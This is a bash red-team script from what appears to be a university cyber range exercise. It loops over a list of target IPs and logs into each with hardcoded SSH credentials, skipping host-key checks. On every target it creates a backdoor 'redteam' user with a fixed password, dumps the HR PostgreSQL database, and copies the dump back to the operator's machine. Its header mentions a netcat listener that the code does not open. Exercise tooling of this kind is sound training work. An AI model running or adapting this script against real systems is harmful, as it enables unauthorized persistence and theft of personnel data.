#!/bin/bash
<<COMMENT
=============================================================================
 Central Texas Cyber Range (CTCR)
=============================================================================
 Maker:       Ethan Vowels
 Maintainer:  Ethan Vowels
 Project:     CIIRC
 Filename:    connectAndPersist.sh
Git: Abanisenioluwa_oroj1
 Description:
    This script will connect to each client multiple times using ssh, it will create a redteam account, extract a database, and open a netcat listener
 Extension Principle:
    None
 License:
    MIT
 Additional Information:
    - Date Created: 5/17/2024
    - Last Updated: 10/16/2024
    - Contact: ethan_vowels1@baylor.edu
    - Repository: Gitlab CIIRC Hack
=============================================================================
COMMENT

# Ensure this script is run with a file as an argument
if [ $# -ne 1 ]; then
  echo "Usage: $0 <IP_Address_File>"
  exit 1
fi

# Ensure the file exists and is readable
if [ ! -f "$1" ] || [ ! -r "$1" ]; then
  echo "Error: File $1 does not exist or is not readable."
  exit 1
fi

# Collect all IP addresses from the file and store them in an array
TARGET_IPS=()
while IFS= read -r ip || [[ -n "$ip" ]]; do
  TARGET_IPS+=("$ip")
done < "$1"

# SSH User and Password
SSH_USER="hr"
SSH_PASS="MegaBiteRules23!"

# New user to be created on the target system for demonstration purposes
NEW_USER="redteam"
NEW_USER_PASS="InTheMainframe"

# Local file to simulate exfiltration
FILE_TO_EXFILTRATE="/home/hr/db_dump.sql"
DESTINATION_PATH="/home/cybears"

# Counter for pgdump files
PGDUMP_COUNTER=1

# Loop through each IP address provided
for TARGET_IP in "${TARGET_IPS[@]}"; do
  echo "Processing target: $TARGET_IP"
  
  # Check if the user already exists
  sshpass -p "$SSH_PASS" ssh -o StrictHostKeyChecking=no $SSH_USER@"$TARGET_IP" << EOF
  # Delete existing user (if exists)
  echo "$SSH_PASS" | sudo -S deluser redteam
  # Add new user and set password
  echo "$SSH_PASS" | sudo -S useradd -m $NEW_USER
  echo "$SSH_PASS" | sudo -S bash -c "echo '$NEW_USER:$NEW_USER_PASS' | chpasswd"
EOF
  
  # Creating db_dump
  echo "Creating db_dump on target system..."
  sshpass -p "$SSH_PASS" ssh -o StrictHostKeyChecking=no $SSH_USER@"$TARGET_IP" "echo '$SSH_PASS' | sudo -S -u $SSH_USER pg_dump -h localhost -d hr -f $FILE_TO_EXFILTRATE"
  
  # Simulate exfiltration of 'db_dump.txt'
  echo "Simulating exfiltration of $FILE_TO_EXFILTRATE from target..."
  sshpass -p "$SSH_PASS" scp -o StrictHostKeyChecking=no $SSH_USER@"$TARGET_IP":"$FILE_TO_EXFILTRATE" "$DESTINATION_PATH/pgdump$PGDUMP_COUNTER"
  
  echo "Done with target: $TARGET_IP"
  
  # Increment the counter
  ((PGDUMP_COUNTER++))
done